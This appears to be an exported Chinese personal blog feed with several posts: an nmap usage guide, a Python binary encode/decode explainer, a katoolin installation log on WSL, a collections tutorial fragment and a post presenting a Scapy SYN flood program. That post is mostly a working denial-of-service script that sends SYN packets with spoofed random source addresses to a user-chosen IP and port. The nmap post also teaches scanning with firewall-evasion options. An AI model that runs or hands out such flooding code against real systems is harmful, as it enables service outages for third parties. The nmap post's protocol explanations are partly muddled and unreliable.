--min-rtt-timeout&#x2F;max-rtt-timeout&#x2F;initial-rtt-timeout &lt;time&gt;: Specifies</span><br><span class="line">      probe round trip time.</span><br><span class="line">  --max-retries &lt;tries&gt;: Caps number of port scan probe retransmissions.</span><br><span class="line">  --host-timeout &lt;time&gt;: Give up on target after this long</span><br><span class="line">  --scan-delay&#x2F;--max-scan-delay &lt;time&gt;: Adjust delay between probes</span><br><span class="line">  --min-rate &lt;number&gt;: Send packets no slower than &lt;number&gt; per second</span><br><span class="line">  --max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per second</span><br><span class="line">FIREWALL&#x2F;IDS EVASION AND SPOOFING:</span><br><span class="line">  -f; --mtu &lt;val&gt;: fragment packets (optionally w&#x2F;given MTU)</span><br><span class="line">  -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys</span><br><span class="line">  -S &lt;IP_Address&gt;: Spoof source address</span><br><span class="line">  -e &lt;iface&gt;: Use specified interface</span><br><span class="line">  -g&#x2F;--source-port &lt;portnum&gt;: Use given port number</span><br><span class="line">  --proxies &lt;url1,[url2],...&gt;: Relay connections through HTTP&#x2F;SOCKS4 proxies</span><br><span class="line">  --data &lt;hex string&gt;: Append a custom payload to sent packets</span><br><span class="line">  --data-string &lt;string&gt;: Append a custom ASCII string to sent packets</span><br><span class="line">  --data-length &lt;num&gt;: Append random data to sent packets</span><br><span class="line">  --ip-options &lt;options&gt;: Send packets with specified ip options</span><br><span class="line">  --ttl &lt;val&gt;: Set IP time-to-live field</span><br><span class="line">  --spoof-mac &lt;mac address&#x2F;prefix&#x2F;vendor name&gt;: Spoof your MAC address</span><br><span class="line">  --badsum: Send packets with a bogus TCP&#x2F;UDP&#x2F;SCTP checksum</span><br><span class="line">OUTPUT:</span><br><span class="line">  -oN&#x2F;-oX&#x2F;-oS&#x2F;-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,</span><br><span class="line">     and Grepable format, respectively, to the given filename.</span><br><span class="line">  -oA &lt;basename&gt;: Output in the three major formats at once</span><br><span class="line">  -v: Increase verbosity level (use -vv or more for greater effect)</span><br><span class="line">  -d: Increase debugging level (use -dd or more for greater effect)</span><br><span class="line">  --reason: Display the reason a port is in a particular state</span><br><span class="line">  --open: Only show open (or possibly open) ports</span><br><span class="line">  --packet-trace: Show all packets sent and received</span><br><span class="line">  --iflist: Print host interfaces and routes (for debugging)</span><br><span class="line">  --append-output: Append to rather than clobber specified output files</span><br><span class="line">  --resume &lt;filename&gt;: Resume an aborted scan</span><br><span class="line">  --stylesheet &lt;path&#x2F;URL&gt;: XSL stylesheet to transform XML output to HTML</span><br><span class="line">  --webxml: Reference stylesheet from Nmap.Org for more portable XML</span><br><span class="line">  --no-stylesheet: Prevent associating of XSL stylesheet w&#x2F;XML output</span><br><span class="line">MISC:</span><br><span class="line">  -6: Enable IPv6 scanning</span><br><span class="line">  -A: Enable OS detection, version detection, script scanning, and traceroute</span><br><span class="line">  --datadir &lt;dirname&gt;: Specify custom Nmap data file location</span><br><span class="line">  --send-eth&#x2F;--send-ip: Send using raw ethernet frames or IP packets</span><br><span class="line">  --privileged: Assume that the user is fully privileged</span><br><span class="line">  --unprivileged: Assume the user lacks raw socket privileges</span><br><span class="line">  -V: Print version number</span><br><span class="line">  -h: Print this help summary page.</span><br><span class="line">EXAMPLES:</span><br><span class="line">  nmap -v -A scanme.nmap.org</span><br><span class="line">  nmap -v -sn 192.168.0.0&#x2F;16 10.0.0.0&#x2F;8</span><br><span class="line">  nmap -v -iR 10000 -Pn -p 80</span><br><span class="line">SEE THE MAN PAGE (https:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man.html) FOR MORE OPTIONS AND EXAMPLES</span><br></pre></td></tr></table></figure>



<p>是不是特别多?<br><del>可这些都是基础用法:(</del></p>
<p>那我来介绍一些我常用的指令吧.</p>
<hr>
<h3 id="nmap-a-b-c-d"><a href="#nmap-a-b-c-d" class="headerlink" title="nmap a.b.c.d"></a>nmap a.b.c.d</h3><p>基础一点的，最简单的就是:<br>nmap xxx.xxx.xxx.xxx</p>
<p><strong>想不到吧!就是这么简单</strong></p>
<ul>
<li><p>但是,众所周知,在Windows防火墙里有这么一个设置选项:<br><strong>文件和打印机共享(回显请求 - ICMPv4-In)</strong><br>如果把这个禁用的话,理论上来说,在同一个网段里,你ping我是ping不通的,因为我并不会给你发送我的ICMP报文.</p>
</li>
<li><p>这样有什么好处?<br>Obviously, 要想知道好处,那我们得先了解网络扫描的基础.<br>怎么进行网络扫描?<br>最简单的也是最直接的,我们可以直接ping对方的主机.<br><strong>为什么能完成这项操作呢?</strong><br>答案很简单,由于是异常的IP数据报,那么对应的对方的层就是对方的网络层.<br>众所周知,网络层有一个非常著名的Internet控制报文协议(Internet Control Message Protocol).就是它的关系.<br>当你ping对方的主机的时候,对方就会给你发一个ICMP报文,来回应你的ping.<br>这就是探测存活主机的一种方法.</p>
</li>
<li><p>于是乎,关闭了这个功能,对方就不能直接ping到你了,也就对你主机的状态无从得知.</p>
</li>
</ul>
<hr>
<h3 id="Pn"><a href="#Pn" class="headerlink" title="-Pn"></a>-Pn</h3><p>上回书说到,我们可以关闭ICMP回显请求来做到简单的防御.但是nmap这个工具之所以如此受喜爱,也是有原因的.<br>有矛就有盾,一般来说,攻击技术都比防御技术更加先进.或者,换句话说,借用”白帽子讲Web安全”里面的一句话来说,<br>“同样是研究安全,白帽子和黑帽子在工作时的心态是完全不同的.”<br>“对于黑帽子来说,只要能找到系统的一个弱点,就可以达到入侵系统的目的;而对于白帽子来说,必须找到系统的所有弱点,不能有遗漏,才能保证系统不会出现问题.这种差异是由于工作环境与工作目标的不同而导致的.”<br>这揭示了两种群体工作的本质.<br><strong>回到我们的主题.当你的攻击目标不给你发送ICMP回显请求了,那这个时候我们该怎么办呢?</strong></p>
<ul>
<li>Obviously, 我们可以使用-Pn指令<br><code>nmap -Pn xxx.xxx.xxx.xxx</code><br>nmap对于-Pn的解释也很简单暴力,Treat all hosts as online – skip host discovery<br>就是认为所有的主机都是存活的.最简单的也是最直接的,我可以构造一个畸形的IP数据报.这样在同一个网段下,我可以向所有的主机发送这个报文,当然,由于这个IP数据报是畸形的,你肯定不会收到.因为按照网络的结构以及功能来说, 我在本层的工作就由我本层来完成,如果出错,那都是我本层的事,无关高层.于是在这个前提下,对方并不知道你对自己做了什么,但是你就可以探测到存活主机.</li>
</ul>
<hr>
<h3 id="sS"><a href="#sS" class="headerlink" title="-sS"></a>-sS</h3><p>众所周知,-Pn是假定所有的主机都是存活的,但是带来的反作用就是,实在是太慢了.太慢太慢了.<br>有时候真的慢到很难接受.而且最奇怪的一点就是.有时候,你会扫描到一些奇怪的设备,但是这些设备可能没有在使用.<br>(比如说我曾经扫描到几台摄像机= =)</p>
<p>于是,我们采用更快捷的方法.</p>
<p><strong>既然网络层呆不下去了,我们就转战传输层吧</strong></p>
<p>来到传输层,我们就要面对一个很神奇的东西,也是所有面试老哥最烦被问到的问题之一 -“三次握手和四次握手”</p>
<ul>
<li>三次握手:<br>说白了,最简单易懂的说,三次握手就是,让两台计算机认为,我俩已经建立连接了.<br>$$ 说起三次握手,就不得不提到两个东西:Syn(Synchronize)和Ack(Acknowledge),也就是同步序列号和确认序列号<br><em></em><br>First handshake:<br>  客户端发送syn(seq = j)包到服务器,并进入SENT_SEND状态,等待服务器确认;<br><em></em><br>Second handshake:<br>  服务端接收到客户端的syn包,需要确认客户端发来的syn包(ack = j + 1), 同时自己也发送一个syn包(seq = k),也就是syn + ack报文,此时服务器进入SYN_RECV状态<br><em></em><br>Third handshake:<br>  客户端接收到服务端的syn + ack,向服务器发送ack(ack = ｋ + 1),此包发送完毕,进入ESTABLISHED状态<br><em></em><br>是不是很简单,举一个形象化的例子,就是A给B发送一条消息,怎么知道发送到了呢?那就看B发送回来的消息是不是B的消息加上A上一轮发送的消息.<br>如果是,那么,根据逻辑推断,A知道A可以发送,A可以接收,B可以发送,B可以接收.A全知道了<br>但是于此同时,B呢?B只知道A可以发送,B可以发送,B可以接收,唯一不确定的是A可不可以接收.<br>所以此时A要再发送B上一轮的消息给B,这样B知道A可以接收.此时可以认为A和B之间的连接是建立的了.</li>
</ul>
<p>但是,细心的朋友可能已经知道了,如果,在第二次握手的时候,我不发送报文回服务端,作为客户端的我就已经知道了B的主机是存活的.(因为我已经知道了B是可以发送和接收的)<br>于是,我就探测到了B主机存活.<br>具体可以使用<code>nmap -sS xxx.xxx.xxx.xxx</code><br>这是使用Syn进行半连接来扫描的.<br>熟悉tcp报文结构的人都知道,不止syn可以,还有很多其他的也可以.<br>比如说FIN啊,UDP啊之类的,都可以.</p>
<hr>
<h3 id="T-A-O-v等"><a href="#T-A-O-v等" class="headerlink" title="-T, -A, -O, -v等"></a>-T, -A, -O, -v等</h3><p>重要的部分都说完了,现在来说一些细枝末节的吧.</p>
<p>-T: 设置时间参数 0 1 2 3 4 5,越大越快,基本作用也就是慢速欺骗防火墙啊之类的.<br>-O: 探测目标的操作系统,原理就是不同的端口的开放情况<br>-A: 激烈扫描模式,基本上相当于-O + -v + 基本script的扫描,很实用<br>-v: 打印详细信息,意思就是把主机的情况都详细的说明一下</p>
<p>个人喜欢<br><code>nmap -T4 -A -v xxx.xxx.xxx.xxx</code></p>
<hr>
<p>Over!</p>
<p>P.S. 为什么不说-sP呢,因为我是真的不是很喜欢这个东西.老实说,-sP和-Pn没啥太大的差距,反正-Pn也可以混合使用,无所谓啦~</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>介绍</tag>
      </tags>
  </entry>
  <entry>
    <title>Python数据转换二进制</title>
    <url>/2019/12/11/Python%E6%95%B0%E6%8D%AE%E8%BD%AC%E6%8D%A2%E4%BA%8C%E8%BF%9B%E5%88%B6/</url>
    <content><![CDATA[<h2 id="Python把数据转换为二进制"><a href="#Python把数据转换为二进制" class="headerlink" title="Python把数据转换为二进制"></a>Python把数据转换为二进制</h2><hr>
<p>其实说起来,Python说到底还是快捷,方便,看着赏心悦目(对自己).<br>但是如果我放出以下的两个函数,就不是太友好了…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def encode(s):</span><br><span class="line">    return &#39;&#39;.join([bin(ord(c)).replace(&#39;0b&#39;, &#39;&#39;) for c in s])</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def decode(s):</span><br><span class="line">    return &#39;&#39;.join([chr(i) for i in [int(b, 2) for b in s.split(&#39; &#39;)]])</span><br></pre></td></tr></table></figure>

<p>说实话,换做是我,假设是看别人的代码,看到这么一行,我的心态也会直接爆炸.<br>万一这个老哥后面在备注一句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># MAGIC, DON&#39;T TOUCH!</span><br></pre></td></tr></table></figure>
<p>估计心态就直接爆炸.<br>那么,我就来分开说说这个的原理吧= =<br>(推导式真的是一个自己用着很爽,别人看着也很爽的东西= =)</p>
<hr>
<h3 id="Encode"><a href="#Encode" class="headerlink" title="Encode"></a>Encode</h3><p>有一说一,其实原理都很简单.<br>首先介绍一下四个方法:<br>.join()<br>这个得好好说一说,我们暂时把这个方法写成<br>a.join(b)<br>此时a是一个字符,或者是一个字符串,b是一个序列(字符串,列表,元组)<br>规则就是将a插入到b的每一个元素中间.</p>
<p>.replace()<br>简而言之,替换</p>
<p>bin()<br>将int型的数据转换为二进制形式,但是格式是(0b111100),此时,输出的格式是”str”</p>
<p>ord()<br>输出字符的ASCII值</p>
<p>在了解了这些基本用法以后,就可以翻译上面那个函数了.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">return &#39;&#39;.join([bin(ord(c)).replace(&#39;0b&#39;, &#39;&#39;) for c in s])</span><br></pre></td></tr></table></figure>
<p>return不看, ‘’.join()最后看,那么我们目的很明确了,就是翻译后面的推导式.<code>[bin(ord(c)).replace(&#39;0b&#39;, &#39;&#39;) for c in s]</code><br>这个s是函数输入进来的字符串s.<br>大概意思就是说,<br>c = s[i]<br>把c变成ASCII码,再把这个ASCII码中的0b给扬了,然后保存到这个列表里.<br>最后再把这个列变拼接起来,成为一个字符串.<br>是不是超级简单?<br>那我们就顺势再看看Decode吧!</p>
<hr>
<h3 id="Decode"><a href="#Decode" class="headerlink" title="Decode"></a>Decode</h3><p><code>&#39;&#39;.join([chr(i) for i in [int(b, 2) for b in s.split(&#39; &#39;)]])</code><br>了解了第一个,这个就更加简单了啊.<br>主要还是说一下int(b, 2),简单来说,就是强制类型转换为int,并且b是二进制,转换为10进制的数.<br>然后就逐个翻译就好啦.<br>怎么编码,就怎么解码.就完成了进制转换啊!</p>
<hr>
<p>P.S. 为什么会想到写这个呢? 因为再写RC4算法的时候,突然想到了,就心血来潮的给写了.然后后来自己看着都烦,于是正好借着机会给自己疏通疏通.<br>(真就是写推导式的坏处啊,还不写备注= =)</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Syn_Flood</title>
    <url>/2019/12/01/Syn-Flood/</url>
    <content><![CDATA[<h2 id="Syn-Flood攻击程序"><a href="#Syn-Flood攻击程序" class="headerlink" title="Syn_Flood攻击程序"></a>Syn_Flood攻击程序</h2><hr>
<h3 id="什么是SYN？"><a href="#什么是SYN？" class="headerlink" title="什么是SYN？"></a>什么是SYN？</h3><ul>
<li><a href="https://baike.baidu.com/item/SYN/8880122?fr=aladdin">SYN</a>：同步序列编号（Synchronize Sequence Numbers）。是TCP/IP建立连接时使用的握手信号。在客户机和服务器之间建立正常的TCP网络连接时，客户机首先发出一个SYN消息，服务器使用SYN+ACK应答表示接收到了这个消息，最后客户机再以ACK消息响应。这样在客户机和服务器之间才能建立起可靠的TCP连接，数据才可以在客户机和服务器之间传递。</li>
<li>TCP连接的第一个包，非常小的一种数据包。SYN 攻击包括大量此类的包，由于这些包看上去来自实际不存在的站点，因此无法有效进行处理。每个机器的欺骗包都要花几秒钟进行尝试方可放弃提供正常响应。</li>
</ul>
<h3 id="SYN-Flood-攻击"><a href="#SYN-Flood-攻击" class="headerlink" title="SYN Flood 攻击"></a>SYN Flood 攻击</h3><ul>
<li>花了几天时间琢磨了一下(主要是琢磨scapy…)</li>
<li><del>scapy真的是太诱人了(危险发言)</del></li>
</ul>
<h4 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from os import system</span><br><span class="line">from sys import stdout</span><br><span class="line">from random import randint</span><br><span class="line">from scapy.all from *</span><br></pre></td></tr></table></figure>
<p><strong>主要就是这四个库的应用了。</strong><br><strong>不同于C语言的实现，需要自己构造IP数据报和TCP报文，由于拥有scapy这个强大的库，导致实现变得很简单</strong></p>
<ul>
<li>randint()用来生成随机的IP地址</li>
<li>system()用来使用清屏作用(美观是程序员的浪漫不是嘛)</li>
<li>stdout.write()来覆盖打印</li>
</ul>
<p><em><strong>P.S. 安装scapy真的好麻烦，需要先安装它的依赖库，建议直接使用Anaconda</strong></em></p>
<h4 id="生成随机的IP地址"><a href="#生成随机的IP地址" class="headerlink" title="生成随机的IP地址"></a>生成随机的IP地址</h4><p><strong>由于使用的语言是python，导致这一切都变得异常的简单</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def IP_Address():</span><br><span class="line">    ip &#x3D; &#39;.&#39;.join([str(randint(0, 255)) for i in range(4)])</span><br><span class="line">    return ip</span><br></pre></td></tr></table></figure>

<ul>
<li>本质就是利用join()函数和推导式，没什么好说的</li>
</ul>
<h4 id="Syn-Flood函数主体部分"><a href="#Syn-Flood函数主体部分" class="headerlink" title="Syn_Flood函数主体部分"></a>Syn_Flood函数主体部分</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def Syn_Flood(des_ip, des_port, pack_num):</span><br><span class="line">    count &#x3D; 0</span><br><span class="line">    ListA &#x3D; [&#39;p&#39;,&#39;a&#39;,&#39;c&#39;,&#39;k&#39;,&#39;e&#39;,&#39;t&#39;,&#39; &#39;,&#39;s&#39;,&#39;e&#39;,&#39;n&#39;,&#39;d&#39;,&#39;i&#39;,&#39;n&#39;,&#39;g&#39;,&#39;.&#39;,&#39;.&#39;,&#39;.&#39;]</span><br><span class="line">    ListB &#x3D; [&#39;P&#39;,&#39;A&#39;,&#39;C&#39;,&#39;K&#39;,&#39;E&#39;,&#39;T&#39;,&#39; &#39;,&#39;S&#39;,&#39;E&#39;,&#39;N&#39;,&#39;D&#39;,&#39;I&#39;,&#39;N&#39;,&#39;G&#39;,&#39;·&#39;,&#39;·&#39;,&#39;·&#39;]</span><br><span class="line">    for i in range(pack_num):</span><br><span class="line">        con &#x3D; &#39;&#39;</span><br><span class="line">        for j in range(len(ListA)):</span><br><span class="line">            if j &#x3D;&#x3D; i % len(ListA):</span><br><span class="line">                con +&#x3D; ListB[j]</span><br><span class="line">            else:</span><br><span class="line">                con +&#x3D; ListA[j]</span><br><span class="line">        stdout.write(&#39;\r&#123;&#125;&#39;.format(con))</span><br><span class="line">        send_port &#x3D; randint(1000, 9000)</span><br><span class="line">        s_eq &#x3D; randint(1000, 9000)</span><br><span class="line">        w_indow &#x3D; randint(1000, 9000)</span><br><span class="line"></span><br><span class="line">        # 构造IP数据包</span><br><span class="line">        IP_Packet &#x3D; IP ()</span><br><span class="line">        IP_Packet.src &#x3D; IP_Address()</span><br><span class="line">        IP_Packet.dst &#x3D; des_ip</span><br><span class="line"></span><br><span class="line">        # 构造tcp报文</span><br><span class="line">        TCP_Packet &#x3D; TCP ()</span><br><span class="line">        TCP_Packet.sport &#x3D; send_port</span><br><span class="line">        TCP_Packet.dport &#x3D; des_port</span><br><span class="line">        TCP_Packet.flags &#x3D; &#39;S&#39;</span><br><span class="line">        TCP_Packet.seq &#x3D; s_eq</span><br><span class="line">        TCP_Packet.window &#x3D; w_indow</span><br><span class="line"></span><br><span class="line">        send(IP_Packet&#x2F;TCP_Packet, verbose &#x3D; 0)</span><br><span class="line">        count +&#x3D; 1</span><br><span class="line">    stdout.write(&#39;\rTotal sent &#123;&#125;\n&#39;.format(count))</span><br></pre></td></tr></table></figure>

<ul>
<li><del>别问为什么有那么长的ListA和ListB，都是为了好看！！</del></li>
<li>其本质上就是利用scapy构造IP数据报和TCP报文，关于scapy的用法，日后会单独写一篇来做介绍~</li>
<li>这里使用了随机的端口序列，seq序列和window序列。</li>
<li>将构造好的TCP报文发出去，就大功告成啦！</li>
</ul>
<h4 id="主函数部分"><a href="#主函数部分" class="headerlink" title="主函数部分"></a>主函数部分</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    des_ip &#x3D; input(&#39;Destination IP Address:&#39;)</span><br><span class="line">    des_port &#x3D; input(&#39;Destination Port:&#39;)</span><br><span class="line">    pack_num &#x3D; input(&#39;How many packets do you want to send:&#39;)</span><br><span class="line">    system(&#39;clear&#39;)</span><br><span class="line">    Syn_Flood(des_ip, int(des_port), int(pack_num))</span><br><span class="line">    print(&#39;Finish&#39;)</span><br></pre></td></tr></table></figure>

<ul>
<li>没啥好说的，就是输入你的目标地址和目标端口，并且注明发送的数量就好。</li>
</ul>
<p><u><em>切记，一定别忘了强制类型转换为int()，否则无法执行，毕竟谁也不认自己的端口号是一个字符串吧嘻嘻</em></u></p>
<hr>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ul>
<li><strong>怎么说呢，主要还是scapy过于强大，导致原本过于复杂的任务变得非常的轻松。总的来说还是有一些缺憾吧，比如没有加入多线程，没有考虑到相同的mac地址之类的，总之下一次在继续完善吧~</strong></li>
</ul>
]]></content>
      <categories>
        <category>代码</category>
      </categories>
      <tags>
        <tag>SYN攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu安装katoolin工具</title>
    <url>/2019/12/09/Ubuntu%E5%AE%89%E8%A3%85katoolin%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h3 id="Ubuntu安装katoolin安装kali工具集"><a href="#Ubuntu安装katoolin安装kali工具集" class="headerlink" title="Ubuntu安装katoolin安装kali工具集"></a>Ubuntu安装katoolin安装kali工具集</h3><hr>
<p><strong>前言：由于同学推荐，我第一次了解到了 Windows Subsystem of Linux，原了我一直想寻找一款在Windows上运行的bash(除了git bash)</strong></p>
<p><strong>于是突发奇想,打算装一个katoolin玩玩(<del>是自己处理不好了</del>),于是就有了这个记录</strong></p>
<hr>
<p>第一步: 那必然是整WSL啦 (<del>WSL:我死了</del>)</p>
<p>首先要做的是,打开控制面板的程序和功能中的基于Windows的Linux子系统.</p>
<p><del>然后重启啊啥的</del></p>
<p>win + r ,输入 bash</p>
<p>看到一个一闪而过的命令行,大概明白了,没装Linux系统.</p>
<p>于是,开始安装咯~</p>
<hr>
<p>第二步: 良心的Windows自带的商店里自带了Linux,直接搜索框搜索Linux就好啦~</p>
<p>然后选择你要下载的Linux</p>
<p>然后下载完打开,启动,输入用户名,输入密码,完事了.</p>
<p><del>(P.S. 害,第一次的时候用户名第一个字母用了大写,导致一直没过,害我想了半天,那个时候感觉自己无比的弱智…..)</del></p>
<p><strong>NOTICE: 本着原则,我先下载了Kali Linux,但是发现里面啥都没有,只是一个空的系统,非常失望,打算祭出祖传的<code>apt-get update</code>发现我不是root用户!!!!!!!!!</strong></p>
<hr>
<p>第三步: 更换自己的身份</p>
<p>本着方便的原则,我觉得更改自己的<strong>身份</strong>,咱好歹也是<strong>Administrator</strong>啊.</p>
<p>打开祖传的<strong>cmd</strong>(我用的是Anaconda Powershell Prompt),输入命令:<br><code>kali config --default-user root</code><br>重新打开bash,就发现自己是root了<br>然后输入<code>passwd</code>,就可以修改root密码啦<br><strong>484炒鸡简单!</strong></p>
<hr>
<p>第四步: 梦想的破灭</p>
<p>既然都更换身份了,那<strong>新官上任也有三把火啊</strong>,于是熟练的打起了<code>apt-get update</code>,然后发现</p>
<p><strong><font size = 5>啊!!!! 报错啦!!!</font></strong></p>
<p>十分的苦恼,原来自己当了个空官,</p>
<p><strong><font size = 5>害! 此处不留爷, 自有留爷处, 走了!</font></strong></p>
<p>(P.S. 主要是大家都遇到了这个问题, 百度上也没有人解释, 当然主要还是我懒,没有去好好的观看kali的文档,不过当时想到的是别的解决办法就是了)</p>
<hr>
<p>第五步: 开启新的征程</p>
<p>看着自己的国家支离破碎,心里说不出什么滋味.在远行的途中,发现了一个新的国家,叫做Ubuntu.在自己的国家中也听过它的故事,既然自己的国家破碎了,那就去它那里过一过吧.</p>
<p>于是我熟练的又走了1到3步骤,唯一不同的是,国家变了,这个名字,可不能再叫原来的名字了,于是修改如下:<br><code>Ubuntu config --default-user root</code></p>
<hr>
<p>第六步: 一些突发情况</p>
<p>凭着自己的本能, 你输入了如下话语:<br><code>leafpad /etc/apt/source.list</code><br>深思熟虑了一下,我这是在Windows下,哪来的leafpad呢,<br>于是修改话语:<br><code>notepad /etc/apt/source.list</code><br>打开了那个让你熟悉的东西,输入了kali的源,然后配置好了密钥<br>(这一块如果不会的话,<del>可以自行百度</del>,如果要说的话就太长了,牵涉到kali的很多东西)</p>
<p>熟悉的输入<code>apt-get update</code><br>发现还是报错了.可能是我操作不当,或者对某些东西的了解还不够透彻,查阅了资料,翻看了不少东西,发现了katoolin.</p>
<hr>
<p>第七步: 不能在一棵树上吊死</p>
<p>有了这个玩意,兴奋不已,这不是就很舒服嘛!美滋滋.<br>于是,输入了如下命令:<br><del>First, AbeanCC should pass the CET6.</del><br>First: you should install those thing you need.<br>(source.list I return to old-original version(QAQ))</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install git</span><br></pre></td></tr></table></figure>
<p>I’m very surprise that Ubuntu has already install newest version git!!!!</p>
<p>Then: you are supposed to install python2.7<br>As we know, the katoolin need python2.7 environment.<br>So….Let’s do this!</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install python2.7</span><br></pre></td></tr></table></figure>
<p>Check your python is successfully installed, you can input that commend<br>If you are very confidence, you can skip this step!</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2.7 --version</span><br></pre></td></tr></table></figure>

<p>Oh my god!<br>They turn to face each other<br>It was just happened to <del>dance</del><br>That these two programs would meet that day and do their favourite dance<br><del><font size = 4><strong>WOW you can really dance!</strong></font></del><br><del><font size = 4><strong>WOW you can really dance!</strong></font></del></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;LionSec&#x2F;katoolin.git &amp;&amp; cp katoolin&#x2F;katoolin.py &#x2F;usr&#x2F;bin&#x2F;katoolin</span><br></pre></td></tr></table></figure>
<p>Clone from git repository.<br>And copy the python script into catalog which called /usr/bin/</p>
<p>Finish this job, bind the limits of execution authority to python script.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod -x &#x2F;usr&#x2F;bin&#x2F;katoolin</span><br></pre></td></tr></table></figure>

<p>Finally, you just need <code>python2.7 katoolin/katoolin.py</code>.<br>then you can see this view….</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> $$\   $$\             $$\                         $$\ $$\</span><br><span class="line"> $$ | $$  |            $$ |                        $$ |\__|</span><br><span class="line"> $$ |$$  &#x2F;  $$$$$$\  $$$$$$\    $$$$$$\   $$$$$$\  $$ |$$\ $$$$$$$\</span><br><span class="line"> $$$$$  &#x2F;   \____$$\ \_$$  _|  $$  __$$\ $$  __$$\ $$ |$$ |$$  __$$\</span><br><span class="line"> $$  $$&lt;    $$$$$$$ |  Kali linux tools installer |$$ |$$ |$$ |  $$ |</span><br><span class="line"> $$ |\$$\  $$  __$$ |  $$ |$$\ $$ |  $$ |$$ |  $$ |$$ |$$ |$$ |  $$ |</span><br><span class="line"> $$ | \$$\ \$$$$$$$ |  \$$$$  |\$$$$$$  |\$$$$$$  |$$ |$$ |$$ |  $$ |</span><br><span class="line"> \__|  \__| \_______|   \____&#x2F;  \______&#x2F;  \______&#x2F; \__|\__|\__|  \__| V2.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> + -- -- +&#x3D;[ Author: LionSec | Homepage: www.neodrix.com</span><br><span class="line"> + -- -- +&#x3D;[ 331 Tools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[W] Before updating your system , please remove all Kali-linux repositories to avoid any kind of problem .</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1) Add Kali repositories &amp; Update</span><br><span class="line">2) View Categories</span><br><span class="line">3) Install classicmenu indicator</span><br><span class="line">4) Install Kali menu</span><br><span class="line">5) Help</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kat &gt;</span><br></pre></td></tr></table></figure>

<p>If this appear in your screen.<br>You make it, bro!!!!!!<br>Congratulations!!!</p>
<hr>
<p>第八步: 我的一个朋友好了(I am fine)</p>
<p>都装好了还不快用?? 在这傻愣着干嘛!!</p>
<p>END.</p>
<hr>
<p>以上就是我的一次记录,欢迎大家指出问题或者解决我提出的问题,Thanks!<br>(啥, 你问我为啥最后要用英文??? 那必然是快考六级了, 提前练练啊<del>)<br>QQ: 527430509<br>欢迎大家喔</del></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>介绍</tag>
      </tags>
  </entry>
  <entry>
    <title>collections的使用</title>
    <url>/2020/02/10/collections%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction:"></a>Introduction:</h3><p>首先,我得介绍一下这个是个什么东西.<br>collections是Python的一个内建的一个集合模块,提供了许多有用的集合类</p>
<p>这里介绍一些我喜欢用的几个.</p>
<hr>
<h3 id="namedtuple"><a href="#namedtuple" class="headerlink" title="namedtuple"></a>namedtuple</h3><p>由常识可知,在Python中,<code>tuple</code>可以表示不变集合.<br>举个例子,我需要表示一个坐标,那么我们可以<br><code>&gt; p = (1, 2)</code><br>但是看到这个(1, 2),又有谁会知道,这个<code>tuple</code>是表示一个坐标的呢?<br>但是单独的定义一个类又太麻烦,所以这个时候我们就可以利用namedtuple</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">namedtuple(typename: str, field_names: Union[str, Iterable[str]], *, verbose: bool&#x3D;..., rename: bool&#x3D;..., module: Optional[str]&#x3D;...) -&gt; Type[tuple]</span><br></pre></td></tr></table></figure>
<p>这个是namedtuple后面的参数列表<br>Exp.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from collections import namedtuple</span><br><span class="line"></span><br><span class="line">point &#x3D; namedtuple(&quot;point&quot;, [&quot;x&quot;, &quot;y&quot;])</span><br><span class="line">p &#x3D; point(1, 2)</span><br><span class="line">print(p.x, p.y)</span><br></pre></td></tr></table></figure>
<p>此时会输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
<p>其中,我们需要知道的是,namedtuple是tuple的一个子类.<br>就是说,此时的p不仅是tuple,也是namedtuple</p>
<p>但是肯定有人会问,这样有什么好处?<br>好处那肯定是有的,它可以规定一个固定的输入格式.<br>所以我们可以定义一个数据类型,它既可以使用tuple的不可变的特性,又可以根据属性来引用.方便</p>
<hr>
